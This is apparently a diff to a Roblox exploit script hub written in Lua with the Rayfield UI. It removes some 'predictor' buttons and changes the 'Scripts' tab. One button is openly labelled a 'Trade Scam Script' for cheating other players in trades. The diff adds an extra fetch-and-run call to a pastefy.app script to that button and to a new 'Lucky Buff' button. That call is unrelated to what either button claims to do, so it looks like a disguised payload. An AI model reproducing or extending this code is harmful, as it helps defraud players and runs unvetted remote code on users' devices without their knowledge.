@@ -34,36 +34,19 @@ local Window = Rayfield:CreateWindow({
 -- 📌 Create tab Scripts
 local Tab = Window:CreateTab("Scripts", "home")
 
--- 📌 Create new tab Stock Prediction 🌱
-local StockTab = Window:CreateTab("Stock Prediction", "sprout")
-
--- 📌 Add buttons in Stock Prediction tab
-StockTab:CreateButton({
-    Name = "Gear Predictor",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/gear-prediction/refs/heads/main/gear"))()
-    end
-})
-
-StockTab:CreateButton({
-    Name = "Egg Predictor(not working right now)",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/egg-prediction/refs/heads/main/egg"))()
-    end
-})
-
-StockTab:CreateButton({
-    Name = "Seed predictor soon!",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/egg-prediction/refs/heads/main/egg"))()
-    end
-})
-
 -- 📌 Add script buttons in Scripts tab
 Tab:CreateButton({
     Name = "Trade Scam Script(UPDATED!),only work public server,no loading screen,the inventory wont disapear anymore",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
+        loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
+    end
+})
+
+Tab:CreateButton({
+    Name = "Lucky Buff script(NEW!!)you need the best pet in the egg you want(exp:you need kitsune if you open zen egg)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/LuckyBuff/refs/heads/main/ScriptByPhatLee"))()
         loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
     end
 })
